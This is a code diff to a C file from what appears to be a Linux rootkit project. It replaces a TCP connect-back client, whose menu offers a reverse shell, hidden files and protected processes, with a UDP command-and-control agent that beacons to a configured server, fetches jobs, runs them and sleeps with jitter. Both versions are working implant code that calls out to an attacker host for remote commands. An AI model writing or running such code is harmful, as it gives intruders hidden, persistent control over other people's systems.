@@ -1,111 +1,44 @@
-/*
- * wkit | userland binary for wkit rootkit 
- * written by ngn (https://ngn.tf) (2024)
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- *
-*/
+#include "inc/client.h"
+#include "inc/cmd.h"
+#include "inc/job.h"
+#include "inc/util.h"
 
-#include "../inc/config.h"
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <sys/types.h>
-#include <arpa/inet.h>
 #include <stdbool.h>
-#include <string.h>
-#include <stdarg.h>
+#include <strings.h>
+
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
-#include <signal.h>
-#include <stdio.h>
 
-#define eq(s1, s2) strcmp(s1, s2)==0
-#include "util.h"
-#include "cmds.h"
+#include <errno.h>
 
-int handle(int s){
-  ssend(s, RED"          _    _ _\n"RESET);
-  ssend(s, RED"__      _| | _(_) |_\n"RESET);
-  ssend(s, RED"\\ \\ /\\ / / |/ / | __|\n"RESET);
-  ssend(s, RED" \\ V  V /|   <| | |_\n"RESET);
-  ssend(s, RED"  \\_/\\_/ |_|\\_\\_|\\__|\n"RESET);
-  ssend(s, "\n");
+int main() {
+  client_t _client, *client = &_client;
+  job_t    _job, *job       = &_job;
 
-  info(s, "Connection successful");
-  info(s, "Sending the command menu");
-  ssend(s, BOLD RED"1"RESET BOLD" -> Receive reverse shell connection"  RESET"\n");
-  ssend(s, BOLD RED"2"RESET BOLD" -> Make a file hidden"                RESET"\n");
-  ssend(s, BOLD RED"3"RESET BOLD" -> Protect a process"                 RESET"\n");
+  // initializtion
+  randseed();
+  job_new(job, client);
 
-PROMPT:
-  prompt(s);
-  char* op = recvline(s);
-  if(NULL==op)
-    return -1;
-
-  if(strlen(op)==0)
-    ssend(s, "\n");
-
-  int opt = atoi(op);
-
-  switch(opt){
-    case 1:
-      cmd_shell(s);
-      break;
-    case 2:
-      cmd_hide(s);
-      break;
-    case 3:
-      cmd_pid(s);
-      break;
-    default:
-      error(s, "Invalid option!");
-      free(op);
-      goto PROMPT;
-      break;
+  // setup the UDP client connection (also does address resolving)
+  if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT) < 0) {
+    debug("failed to create a connection: %s\n", strerror(errno));
+    return EXIT_FAILURE;
   }
 
-  free(op);
-  return 0;
-}
+  // ask for jobs and handle them
+  while (true) {
+    if (!job_recv(job, true))
+      goto next;
 
-int try(void){
-  struct sockaddr_in addr;
-  int s = socket(AF_INET, SOCK_STREAM, 0);
-  
-  addr.sin_family = AF_INET;       
-  addr.sin_port = htons(PORT);
-  addr.sin_addr.s_addr = inet_addr(IP);
-  int ret = connect(s, (struct sockaddr *) &addr, 
-    sizeof(addr));
+    debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
+    cmd_handle(job);
 
-  if(ret != 0){
-    close(s);
-    return -1;
+  next:
+    jitter();
   }
 
-  printf("Got connection, calling handle\n");
-  handle(s);
-  printf("Closing connection\n");
-  close(s);
-}
-
-int main(void){
-  try();
-  while(true){
-    sleep(5);
-    try();
-  }
-  return 0;
+  // we are done, free/cleanup stuff
+  job_free(job);
+  return EXIT_SUCCESS;
 }
